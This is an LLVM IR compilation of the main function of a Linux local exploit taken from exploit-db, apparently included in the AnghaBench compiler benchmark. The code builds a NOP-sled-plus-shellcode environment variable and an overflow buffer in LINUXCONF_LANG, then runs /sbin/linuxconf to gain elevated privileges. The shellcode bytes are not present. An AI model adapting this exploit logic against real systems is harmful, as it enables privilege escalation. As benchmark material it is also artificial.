; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21762.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21762.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@DEFAULT_EGG_SIZE = common dso_local global i32 0, align 4
@DEFAULT_ALIGN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"Using address: 0x%x\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"LINUXCONF_LANG=\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"/sbin/linuxconf\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"linuxconf\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %16, i32* %11, align 4
  %17 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %17, i32* %12, align 4
  %18 = load i32, i32* @DEFAULT_EGG_SIZE, align 4
  store i32 %18, i32* %14, align 4
  %19 = load i32, i32* @DEFAULT_ALIGN, align 4
  store i32 %19, i32* %15, align 4
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 1
  br i1 %21, label %22, label %27

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25)
  store i32 %26, i32* %12, align 4
  br label %27

27:                                               ; preds = %22, %2
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %28, 2
  br i1 %29, label %30, label %35

30:                                               ; preds = %27
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33)
  store i32 %34, i32* %11, align 4
  br label %35

35:                                               ; preds = %30, %27
  %36 = load i32, i32* %4, align 4
  %37 = icmp sgt i32 %36, 3
  br i1 %37, label %38, label %43

38:                                               ; preds = %35
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 3
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @atoi(i8* %41)
  store i32 %42, i32* %14, align 4
  br label %43

43:                                               ; preds = %38, %35
  %44 = load i32, i32* %4, align 4
  %45 = icmp sgt i32 %44, 4
  br i1 %45, label %46, label %51

46:                                               ; preds = %43
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 4
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @atoi(i8* %49)
  store i32 %50, i32* %15, align 4
  br label %51

51:                                               ; preds = %46, %43
  %52 = load i32, i32* %12, align 4
  %53 = call i8* @malloc(i32 %52)
  store i8* %53, i8** %6, align 8
  %54 = icmp ne i8* %53, null
  br i1 %54, label %58, label %55

55:                                               ; preds = %51
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %57 = call i32 @exit(i32 0) #3
  unreachable

58:                                               ; preds = %51
  %59 = load i32, i32* %14, align 4
  %60 = call i8* @malloc(i32 %59)
  store i8* %60, i8** %8, align 8
  %61 = icmp ne i8* %60, null
  br i1 %61, label %65, label %62

62:                                               ; preds = %58
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %64 = call i32 @exit(i32 0) #3
  unreachable

65:                                               ; preds = %58
  %66 = call i32 (...) @get_esp()
  %67 = load i32, i32* %11, align 4
  %68 = sub nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  store i64 %69, i64* %10, align 8
  %70 = load i64, i64* %10, align 8
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), i64 %70)
  %72 = load i8*, i8** %6, align 8
  store i8* %72, i8** %7, align 8
  %73 = load i8*, i8** %7, align 8
  %74 = load i32, i32* %15, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %73, i64 %75
  %77 = bitcast i8* %76 to i64*
  store i64* %77, i64** %9, align 8
  store i32 0, i32* %13, align 4
  br label %78

78:                                               ; preds = %86, %65
  %79 = load i32, i32* %13, align 4
  %80 = load i32, i32* %12, align 4
  %81 = icmp slt i32 %79, %80
  br i1 %81, label %82, label %89

82:                                               ; preds = %78
  %83 = load i64, i64* %10, align 8
  %84 = load i64*, i64** %9, align 8
  %85 = getelementptr inbounds i64, i64* %84, i32 1
  store i64* %85, i64** %9, align 8
  store i64 %83, i64* %84, align 8
  br label %86

86:                                               ; preds = %82
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 4
  store i32 %88, i32* %13, align 4
  br label %78

89:                                               ; preds = %78
  %90 = load i8*, i8** %8, align 8
  store i8* %90, i8** %7, align 8
  store i32 0, i32* %13, align 4
  br label %91

91:                                               ; preds = %104, %89
  %92 = load i32, i32* %13, align 4
  %93 = load i32, i32* %14, align 4
  %94 = load i32*, i32** @shellcode, align 8
  %95 = call i32 @strlen(i32* %94)
  %96 = sub nsw i32 %93, %95
  %97 = sub nsw i32 %96, 1
  %98 = icmp slt i32 %92, %97
  br i1 %98, label %99, label %107

99:                                               ; preds = %91
  %100 = load i32, i32* @NOP, align 4
  %101 = trunc i32 %100 to i8
  %102 = load i8*, i8** %7, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %7, align 8
  store i8 %101, i8* %102, align 1
  br label %104

104:                                              ; preds = %99
  %105 = load i32, i32* %13, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %13, align 4
  br label %91

107:                                              ; preds = %91
  store i32 0, i32* %13, align 4
  br label %108

108:                                              ; preds = %122, %107
  %109 = load i32, i32* %13, align 4
  %110 = load i32*, i32** @shellcode, align 8
  %111 = call i32 @strlen(i32* %110)
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %125

113:                                              ; preds = %108
  %114 = load i32*, i32** @shellcode, align 8
  %115 = load i32, i32* %13, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %114, i64 %116
  %118 = load i32, i32* %117, align 4
  %119 = trunc i32 %118 to i8
  %120 = load i8*, i8** %7, align 8
  %121 = getelementptr inbounds i8, i8* %120, i32 1
  store i8* %121, i8** %7, align 8
  store i8 %119, i8* %120, align 1
  br label %122

122:                                              ; preds = %113
  %123 = load i32, i32* %13, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %13, align 4
  br label %108

125:                                              ; preds = %108
  %126 = load i8*, i8** %6, align 8
  %127 = load i32, i32* %12, align 4
  %128 = sub nsw i32 %127, 1
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %126, i64 %129
  store i8 0, i8* %130, align 1
  %131 = load i8*, i8** %8, align 8
  %132 = load i32, i32* %14, align 4
  %133 = sub nsw i32 %132, 1
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8, i8* %131, i64 %134
  store i8 0, i8* %135, align 1
  %136 = load i8*, i8** %8, align 8
  %137 = call i32 @memcpy(i8* %136, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i32 4)
  %138 = load i8*, i8** %8, align 8
  %139 = call i32 @putenv(i8* %138)
  %140 = load i8*, i8** %6, align 8
  %141 = call i32 @memcpy(i8* %140, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 15)
  %142 = load i8*, i8** %6, align 8
  %143 = call i32 @putenv(i8* %142)
  %144 = call i32 @execl(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i32* null)
  %145 = load i32, i32* %3, align 4
  ret i32 %145
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
